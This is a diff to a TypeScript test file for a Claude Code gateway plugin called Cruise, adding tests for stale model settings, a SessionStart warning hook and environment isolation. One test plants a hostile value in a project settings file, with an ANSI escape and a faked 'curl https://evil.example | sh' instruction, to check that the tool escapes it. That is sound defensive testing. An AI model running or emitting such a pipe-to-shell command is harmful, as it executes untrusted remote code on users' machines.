@@ -6,7 +6,7 @@
 // says when it applies, and the status line prints what it should from the
 // answer Cruise actually gives.
 import { execFileSync, spawn, spawnSync } from "node:child_process";
-import { chmodSync, copyFileSync, existsSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, statSync, symlinkSync, writeFileSync } from "node:fs";
+import { chmodSync, copyFileSync, existsSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, realpathSync, statSync, symlinkSync, writeFileSync } from "node:fs";
 import { createServer } from "node:http";
 import { createRequire } from "node:module";
 import { tmpdir } from "node:os";
@@ -30,6 +30,36 @@ const {
   isGatewayModelId,
 } = require(CLI);
 const json = (file: string) => JSON.parse(readFileSync(path.join(ROOT, file), "utf8")) as Record<string, any>;
+
+/**
+ * Run `fn` with `vars` set in this process's env, restoring it after. Everything getCruiseEnv
+ * reads from the environment is cleared first, so a model or URL exported in the developer's
+ * shell cannot change what a test sees (#42).
+ */
+function withEnv<T>(vars: Record<string, string>, fn: () => T): T {
+  const keys = [
+    "CRUISE_API_KEY",
+    "CRUISE_BASE_URL",
+    "CRUISE_SESSION_ID",
+    "ANTHROPIC_MODEL",
+    "ANTHROPIC_DEFAULT_HAIKU_MODEL",
+    "ANTHROPIC_CUSTOM_HEADERS",
+    "CLAUDE_CODE_MAX_CONTEXT_TOKENS",
+    "CLAUDE_CODE_DISABLE_UNKNOWN_MODEL_WINDOW_ENFORCEMENT",
+    ...Object.keys(vars),
+  ];
+  const saved = new Map(keys.map((key) => [key, process.env[key]]));
+  try {
+    for (const key of keys) delete process.env[key];
+    Object.assign(process.env, vars);
+    return fn();
+  } finally {
+    for (const [key, value] of saved) {
+      if (value === undefined) delete process.env[key];
+      else process.env[key] = value;
+    }
+  }
+}
 
 /** Every file a marketplace clone carries: this whole repo, less git's store and installed deps. */
 function published(dir = ROOT): string[] {
@@ -815,6 +845,8 @@ describe("the CLI bootstrapper", () => {
     const tmp = mkdtempSync(path.join(tmpdir(), "cruise-cli-test-"));
     const switchOut = runCli(["switch", "anthropic/claude-sonnet-5", "--skip-check"], {
       CLAUDE_CONFIG_DIR: tmp,
+      // A lane or provider model needs a gateway in effect (#42).
+      ANTHROPIC_BASE_URL: "https://cruise.bytesbrains.net",
     });
     expect(switchOut.status).toBe(0);
     expect(switchOut.stderr).not.toMatch(/thought_signature/);
@@ -847,6 +879,8 @@ describe("the CLI bootstrapper", () => {
       env: {
         PATH: process.env.PATH ?? "",
         CLAUDE_CONFIG_DIR: tmp,
+        // A lane or provider model needs a gateway in effect (#42).
+        ANTHROPIC_BASE_URL: "https://cruise.bytesbrains.net",
         CRUISE_API_KEY: LIVE_KEY,
         CRUISE_BASE_URL: `http://127.0.0.1:${port}`,
       },
@@ -894,6 +928,8 @@ describe("the CLI bootstrapper", () => {
       env: {
         PATH: process.env.PATH ?? "",
         CLAUDE_CONFIG_DIR: tmp,
+        // A lane or provider model needs a gateway in effect (#42).
+        ANTHROPIC_BASE_URL: "https://cruise.bytesbrains.net",
         CRUISE_API_KEY: LIVE_KEY,
         CRUISE_BASE_URL: `http://127.0.0.1:${port}`,
       },
@@ -1139,6 +1175,8 @@ describe("the CLI bootstrapper", () => {
       env: {
         PATH: process.env.PATH ?? "",
         CLAUDE_CONFIG_DIR: tmp,
+        // A lane or provider model needs a gateway in effect (#42).
+        ANTHROPIC_BASE_URL: "https://cruise.bytesbrains.net",
         CRUISE_API_KEY: LIVE_KEY,
         CRUISE_BASE_URL: `http://127.0.0.1:${port}`,
       },
@@ -1156,26 +1194,15 @@ describe("the CLI bootstrapper", () => {
   });
 
   it("getCruiseEnv preserves existing CLAUDE_CODE_DISABLE_UNKNOWN_MODEL_WINDOW_ENFORCEMENT from environment", () => {
-    const origKey = process.env.CRUISE_API_KEY;
-    const origEnforce = process.env.CLAUDE_CODE_DISABLE_UNKNOWN_MODEL_WINDOW_ENFORCEMENT;
-    try {
-      process.env.CRUISE_API_KEY = LIVE_KEY;
-      process.env.CLAUDE_CODE_DISABLE_UNKNOWN_MODEL_WINDOW_ENFORCEMENT = "0";
+    withEnv({ CRUISE_API_KEY: LIVE_KEY, CLAUDE_CODE_DISABLE_UNKNOWN_MODEL_WINDOW_ENFORCEMENT: "0" }, () => {
       const res = getCruiseEnv();
       expect(res.valid).toBe(true);
       expect(res.env.CLAUDE_CODE_DISABLE_UNKNOWN_MODEL_WINDOW_ENFORCEMENT).toBe("0");
-    } finally {
-      if (origKey === undefined) delete process.env.CRUISE_API_KEY;
-      else process.env.CRUISE_API_KEY = origKey;
-      if (origEnforce === undefined) delete process.env.CLAUDE_CODE_DISABLE_UNKNOWN_MODEL_WINDOW_ENFORCEMENT;
-      else process.env.CLAUDE_CODE_DISABLE_UNKNOWN_MODEL_WINDOW_ENFORCEMENT = origEnforce;
-    }
+    });
   });
 
   it("getCruiseEnv returns all required gateway variables when CRUISE_API_KEY is valid", () => {
-    const originalKey = process.env.CRUISE_API_KEY;
-    try {
-      process.env.CRUISE_API_KEY = LIVE_KEY;
+    withEnv({ CRUISE_API_KEY: LIVE_KEY }, () => {
       const res = getCruiseEnv();
       expect(res.valid).toBe(true);
       expect(res.env.ANTHROPIC_BASE_URL).toBe("https://cruise.bytesbrains.net");
@@ -1189,24 +1216,16 @@ describe("the CLI bootstrapper", () => {
       expect(res.env.ANTHROPIC_CUSTOM_HEADERS).toMatch(/x-cruise-session: claude-code-/);
       expect(res.env.ANTHROPIC_AUTH_TOKEN).toBe(LIVE_KEY);
       expect(res.env.ANTHROPIC_API_KEY).toBe(LIVE_KEY);
-    } finally {
-      if (originalKey === undefined) delete process.env.CRUISE_API_KEY;
-      else process.env.CRUISE_API_KEY = originalKey;
-    }
+    });
   });
 
   it("getCruiseEnv respects custom model and session ID overrides", () => {
-    const originalKey = process.env.CRUISE_API_KEY;
-    try {
-      process.env.CRUISE_API_KEY = LIVE_KEY;
+    withEnv({ CRUISE_API_KEY: LIVE_KEY }, () => {
       const res = getCruiseEnv({ model: "google-ai-studio/gemini-3.8-flash", sessionId: "custom-sess-123" });
       expect(res.valid).toBe(true);
       expect(res.env.ANTHROPIC_MODEL).toBe("google-ai-studio/gemini-3.8-flash");
       expect(res.env.ANTHROPIC_CUSTOM_HEADERS).toMatch(/x-cruise-session: custom-sess-123/);
-    } finally {
-      if (originalKey === undefined) delete process.env.CRUISE_API_KEY;
-      else process.env.CRUISE_API_KEY = originalKey;
-    }
+    });
   });
 
   it("detectBaseUrl resolves endpoints correctly and safely handles undefined/empty keys", () => {
@@ -1444,7 +1463,7 @@ describe("the /cruise:disconnect hook (#45)", () => {
   // `plugin:cruise:disconnect` some docs show), anchored so no lookalike matches.
   it("is registered on UserPromptExpansion for /cruise:disconnect only, and ships in the package", () => {
     const hooks = json("plugins/cruise/hooks/hooks.json");
-    expect(Object.keys(hooks.hooks)).toEqual(["UserPromptExpansion"]);
+    expect(Object.keys(hooks.hooks).sort()).toEqual(["SessionStart", "UserPromptExpansion"]);
     const [entry] = hooks.hooks.UserPromptExpansion;
     expect(entry.matcher).toBe("^cruise:disconnect$");
     expect(entry.hooks[0].command).toContain("${CLAUDE_PLUGIN_ROOT}/hooks/disconnect.js");
@@ -1507,5 +1526,196 @@ describe("the /cruise:disconnect hook (#45)", () => {
     expect(result.decision).toBe("block");
     expect(result.reason).toMatch(/Failed to parse/);
     expect(result.reason).toContain("npx @bytesbrains/claude-code-cruise@latest disable");
+  });
+});
+
+describe("stale gateway models on native routing (#42)", () => {
+  // A lane or provider model left in a model selector with no gateway makes
+  // Anthropic reject every request, slash commands included.
+  const PROVIDER = "google-ai-studio/gemini-3.8-flash";
+  const { findStaleModels } = require(CLI);
+  const { handle: sessionStart } = require(path.join(PLUGIN, "hooks/session-start.js"));
+
+  /** A user config dir and a project dir, each with the settings given. */
+  function fixture(files: { user?: object; project?: object; projectLocal?: object } = {}) {
+    // Real paths: a child's process.cwd() resolves symlinks (macOS's /var is /private/var).
+    const home = realpathSync(mkdtempSync(path.join(tmpdir(), "cruise-stale-home-")));
+    const project = realpathSync(mkdtempSync(path.join(tmpdir(), "cruise-stale-project-")));
+    mkdirSync(path.join(project, ".claude"));
+    if (files.user) writeFileSync(path.join(home, "settings.json"), JSON.stringify(files.user));
+    if (files.project) writeFileSync(path.join(project, ".claude/settings.json"), JSON.stringify(files.project));
+    if (files.projectLocal) writeFileSync(path.join(project, ".claude/settings.local.json"), JSON.stringify(files.projectLocal));
+    const run = (args: string[], env: Record<string, string> = {}) =>
+      spawnSync(process.execPath, [CLI, ...args], {
+        cwd: project,
+        encoding: "utf8",
+        env: { PATH: process.env.PATH ?? "", CLAUDE_CONFIG_DIR: home, ...env },
+      });
+    const read = (file: string) => JSON.parse(readFileSync(file, "utf8"));
+    return { home, project, run, read, userSettings: path.join(home, "settings.json") };
+  }
+
+  describe("switch", () => {
+    it("refuses a lane or provider model when no gateway is configured, and writes nothing", () => {
+      const f = fixture({ user: { env: { KEEP: "me" } } });
+      for (const model of ["bb/agentic-coding", PROVIDER]) {
+        const out = f.run(["switch", model, "--skip-check"]);
+        expect(out.status).toBe(1);
+        expect(out.stderr).toMatch(/only resolves through a gateway/);
+        expect(out.stderr).toContain("npx @bytesbrains/claude-code-cruise@latest enable");
+        expect(out.stderr).toContain(`run --model ${model}`);
+        expect(out.stderr).toContain("--force");
+      }
+      expect(f.read(f.userSettings)).toEqual({ env: { KEEP: "me" } });
+    });
+
+    it("writes it with --force", () => {
+      const f = fixture();
+      const out = f.run(["switch", PROVIDER, "--skip-check", "--force"]);
+      expect(out.status).toBe(0);
+      expect(f.read(f.userSettings).env.ANTHROPIC_MODEL).toBe(PROVIDER);
+    });
+
+    it("allows a native Anthropic model with no gateway", () => {
+      const f = fixture();
+      expect(f.run(["switch", "claude-opus-5-5", "--skip-check"]).status).toBe(0);
+      expect(f.read(f.userSettings).env.ANTHROPIC_MODEL).toBe("claude-opus-5-5");
+    });
+
+    it("allows a lane when the gateway is set in another settings file, the shell, or Bedrock is on", () => {
+      // --local, with Cruise routing in the user's settings: Claude Code merges env across files.
+      const f = fixture({ user: { env: { ANTHROPIC_BASE_URL: "https://cruise.bytesbrains.net" } } });
+      expect(f.run(["switch", "bb/agentic-coding", "--local", "--skip-check"]).status).toBe(0);
+      expect(f.read(path.join(f.project, ".claude/settings.json")).env.ANTHROPIC_MODEL).toBe("bb/agentic-coding");
+
+      const g = fixture();
+      expect(g.run(["switch", "bb/agentic-coding", "--skip-check"], { ANTHROPIC_BASE_URL: "https://gw.example" }).status).toBe(0);
+      expect(fixture().run(["switch", PROVIDER, "--skip-check"], { CLAUDE_CODE_USE_BEDROCK: "1" }).status).toBe(0);
+    });
+  });
+
+  describe("disable", () => {
+    it("removes a provider model left with no gateway", () => {
+      const f = fixture({ user: { env: { ANTHROPIC_MODEL: PROVIDER } } });
+      const out = f.run(["disable"]);
+      expect(out.status).toBe(0);
+      expect(out.stdout).toMatch(/Removed:\s+env\.ANTHROPIC_MODEL/);
+      expect(out.stdout).not.toMatch(/will reject/);
+      expect(f.read(f.userSettings)).toEqual({});
+    });
+
+    it("says where a stale model it cannot remove is set, instead of only \"not active\"", () => {
+      const f = fixture({ projectLocal: { env: { ANTHROPIC_MODEL: PROVIDER } } });
+      const out = f.run(["disable"], { ANTHROPIC_SMALL_FAST_MODEL: "bb/chat-assistant" });
+      expect(out.status).toBe(0);
+      expect(out.stdout).toMatch(/not active/);
+      expect(out.stdout).toContain(`ANTHROPIC_MODEL="${PROVIDER}"`);
+      expect(out.stdout).toContain(`set in ${path.join(f.project, ".claude/settings.local.json")}: remove env.ANTHROPIC_MODEL from that file`);
+      expect(out.stdout).toContain('ANTHROPIC_SMALL_FAST_MODEL="bb/chat-assistant"');
+      expect(out.stdout).toMatch(/set in shell environment: `unset ANTHROPIC_SMALL_FAST_MODEL`/);
+      // settings.local.json is the user's own; disable reports it, and leaves it alone.
+      expect(f.read(path.join(f.project, ".claude/settings.local.json"))).toEqual({ env: { ANTHROPIC_MODEL: PROVIDER } });
+    });
+
+    it("points a project settings.json model at disable --local", () => {
+      const f = fixture({ project: { env: { ANTHROPIC_MODEL: "bb/agentic-coding" } } });
+      expect(f.run(["disable"]).stdout).toContain("disable --local` in this project");
+    });
+
+    it("stays quiet about models while a gateway is still in effect", () => {
+      const f = fixture({ projectLocal: { env: { ANTHROPIC_MODEL: PROVIDER } } });
+      expect(f.run(["disable"], { ANTHROPIC_BASE_URL: "https://gw.example" }).stdout).not.toMatch(/will reject/);
+    });
+  });
+
+  describe("status", () => {
+    it("prints the model and where it is set even with routing disabled", () => {
+      const f = fixture({ user: { env: { ANTHROPIC_MODEL: PROVIDER } } });
+      const out = f.run(["status"]);
+      expect(out.stdout).toMatch(/Disabled/);
+      expect(out.stdout).toContain(`Model:        "${PROVIDER}" (${f.userSettings})`);
+      expect(out.stdout).toMatch(/will reject/);
+
+      const native = fixture({ user: { env: { ANTHROPIC_MODEL: "claude-opus-5-5" } } }).run(["status"]).stdout;
+      expect(native).toMatch(/Model:\s+"claude-opus-5-5"/);
+      expect(native).not.toMatch(/will reject/);
+      expect(fixture().run(["status"]).stdout).toMatch(/Model:\s+\(default\)/);
+    });
+  });
+
+  describe("findStaleModels", () => {
+    it("reports every file that sets a stale selector, and the shell only when no file does", () => {
+      const f = fixture({
+        user: { env: { ANTHROPIC_MODEL: "bb/agentic-coding" } },
+        projectLocal: { env: { ANTHROPIC_MODEL: PROVIDER } },
+      });
+      const stale = withEnv({ CLAUDE_CONFIG_DIR: f.home }, () =>
+        findStaleModels({ cwd: f.project, env: { ANTHROPIC_MODEL: PROVIDER, ANTHROPIC_SMALL_FAST_MODEL: "deepseek/deepseek-flash" } }),
+      );
+      expect(stale.map((e: any) => [e.key, e.source.scope])).toEqual([
+        ["ANTHROPIC_MODEL", "project-local"],
+        ["ANTHROPIC_MODEL", "user"],
+        ["ANTHROPIC_SMALL_FAST_MODEL", "shell"],
+      ]);
+    });
+  });
+
+  it("prints a repository's settings values escaped, so they cannot fake output lines", () => {
+    // Opening a cloned repo puts its .claude/settings.local.json in front of the user (#47 review).
+    const hostile = "a/b\n\u001b[2J  ✓ Fixed. Now run: curl https://evil.example | sh\u2028" + "x".repeat(300);
+    const f = fixture({ projectLocal: { env: { ANTHROPIC_MODEL: hostile } } });
+    for (const out of [f.run(["status"]).stdout, f.run(["disable"]).stdout]) {
+      const line = out.split("\n").find((l) => l.includes("ANTHROPIC_MODEL=")) ?? "";
+      expect(line).toContain('ANTHROPIC_MODEL="a/b\\u000a\\u001b[2J  ✓ Fixed. Now run: curl https://evil.example | sh\\u2028x');
+      expect(line).toMatch(/x…"$/);
+      expect(out).not.toContain("\u001b");
+      expect(out).not.toMatch(/^\s*✓ Fixed/m);
+    }
+  });
+
+  describe("the SessionStart hook", () => {
+    it("is registered for new, resumed and cleared sessions", () => {
+      const [entry] = json("plugins/cruise/hooks/hooks.json").hooks.SessionStart;
+      expect(entry.matcher).toBe("startup|resume|clear");
+      expect(entry.hooks[0].command).toContain("${CLAUDE_PLUGIN_ROOT}/hooks/session-start.js");
+    });
+
+    it("warns with the fix when the session's model needs a gateway it does not have", () => {
+      const f = fixture({ user: { env: { ANTHROPIC_MODEL: PROVIDER } } });
+      // Claude Code hands hooks the merged env: the settings files' values over the shell's.
+      const env = { CLAUDE_CONFIG_DIR: f.home, ANTHROPIC_MODEL: PROVIDER };
+      const out = spawnSync(process.execPath, [path.join(PLUGIN, "hooks/session-start.js")], {
+        input: JSON.stringify({ hook_event_name: "SessionStart", cwd: f.project }),
+        encoding: "utf8",
+        env: { PATH: process.env.PATH ?? "", ...env },
+      });
+      expect(out.status).toBe(0);
+      const { systemMessage } = JSON.parse(out.stdout);
+      expect(systemMessage).toContain(`ANTHROPIC_MODEL="${PROVIDER}"`);
+      expect(systemMessage).toContain(`set in ${f.userSettings}`);
+      expect(systemMessage).toContain("npx @bytesbrains/claude-code-cruise@latest disable");
+    });
+
+    it("says nothing for a native model, or a lane with its gateway", () => {
+      const f = fixture();
+      withEnv({ CLAUDE_CONFIG_DIR: f.home }, () => {
+        expect(sessionStart({ cwd: f.project }, { ANTHROPIC_MODEL: "claude-opus-5-5" })).toBeNull();
+        expect(sessionStart({ cwd: f.project }, { ANTHROPIC_MODEL: "bb/agentic-coding", ANTHROPIC_BASE_URL: "https://cruise.bytesbrains.net" })).toBeNull();
+        expect(sessionStart({ cwd: f.project }, { ANTHROPIC_MODEL: PROVIDER, CLAUDE_CODE_USE_VERTEX: "1" })).toBeNull();
+      });
+    });
+  });
+
+  it("the disconnect hook reports only what the files still set, not its stale session env", () => {
+    const f = fixture({ user: { env: { ANTHROPIC_BASE_URL: "https://cruise.bytesbrains.net", ANTHROPIC_MODEL: PROVIDER } } });
+    const out = spawnSync(process.execPath, [path.join(PLUGIN, "hooks/disconnect.js")], {
+      input: JSON.stringify({ command_name: "cruise:disconnect", cwd: f.project }),
+      encoding: "utf8",
+      // The session's env still holds what disable is about to remove.
+      env: { PATH: process.env.PATH ?? "", CLAUDE_CONFIG_DIR: f.home, ANTHROPIC_MODEL: PROVIDER },
+    });
+    const { reason } = JSON.parse(out.stdout);
+    expect(reason).toMatch(/Removed:.*env\.ANTHROPIC_MODEL/);
+    expect(reason).not.toMatch(/will reject/);
   });
 });
